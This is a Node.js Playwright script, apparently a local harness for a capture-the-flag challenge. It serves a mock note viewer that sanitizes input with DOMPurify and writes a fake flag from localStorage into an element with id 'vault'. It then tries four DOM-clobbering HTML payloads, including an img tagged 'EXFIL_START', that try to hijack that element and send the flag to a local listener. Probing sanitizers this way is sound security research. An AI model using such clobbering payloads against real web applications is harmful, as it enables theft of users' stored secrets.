const { chromium } = require('playwright');
const fs = require('fs');
const path = require('path');
const http = require('http');
const purifySrc = fs.readFileSync(path.join(__dirname,'node_modules','dompurify','dist','purify.min.js'),'utf8');

const APP_HTML = (bodyRaw) => `<!doctype html><html><head></head><body>
<main id="viewer">
  <article class="note"><h1 id="v-title"></h1><div id="note"></div></article>
  <aside class="vault"><h3>Your vault</h3><div id="vault" aria-hidden="true"></div></aside>
</main>
<script>${purifySrc}</script>
<script>
  try {
    localStorage.setItem("flag","NNS{FAKE_LOCAL_FLAG_1234}");
    const raw = ${JSON.stringify(bodyRaw)};
    const c = DOMPurify.sanitize(raw, {FORBID_TAGS:["style"], RETURN_DOM_FRAGMENT:true});
    document.getElementById("note").replaceChildren(c);
    const n = localStorage.getItem("flag");
    if(n){ document.getElementById("vault").textContent = n; }
    window.__ok=true;
  } catch(e){ window.__err=''+e; }
</script>
</body></html>`;

const payloads = {
  'img_clobber': '<img id="vault" src="http://127.0.0.1:9999/EXFIL_START">',
  'a_clobber': '<a id="vault" href="http://127.0.0.1:9999/a">x</a>',
  'form_clobber': '<form id="vault"></form>',
  'img_name': '<img name="vault" src="http://127.0.0.1:9999/named">',
};

(async () => {
  const hits = [];
  const appsrv = http.createServer((req,res)=>{
    hits.push(req.url);
    if(req.url.startsWith('/page')){
      const which = req.url.split('=')[1] || 'img_clobber';
      res.setHeader('Content-Type','text/html');
      res.end(APP_HTML(payloads[which]));
    } else { res.end('ok'); }
  });
  await new Promise(r=>appsrv.listen(9999,r));
  const browser = await chromium.launch();
  for (const name of Object.keys(payloads)) {
    const page = await browser.newPage();
    const before = hits.length;
    await page.goto('http://127.0.0.1:9999/page?p='+name, {waitUntil:'networkidle'}).catch(()=>{});
    await page.waitForTimeout(500);
    const info = await page.evaluate(()=>({
      err: window.__err,
      vtag: document.getElementById('vault') && document.getElementById('vault').tagName,
      vhtml: document.getElementById('vault') && document.getElementById('vault').outerHTML,
      note: document.getElementById('note').innerHTML
    }));
    console.log('\n==',name,'==');
    console.log('vault tag:', info.vtag, '| err:', info.err);
    console.log('vault outerHTML:', info.vhtml);
    console.log('note:', info.note);
    console.log('hits:', JSON.stringify(hits.slice(before).filter(u=>!u.startsWith('/page'))));
    await page.close();
  }
  await browser.close(); appsrv.close();
})();
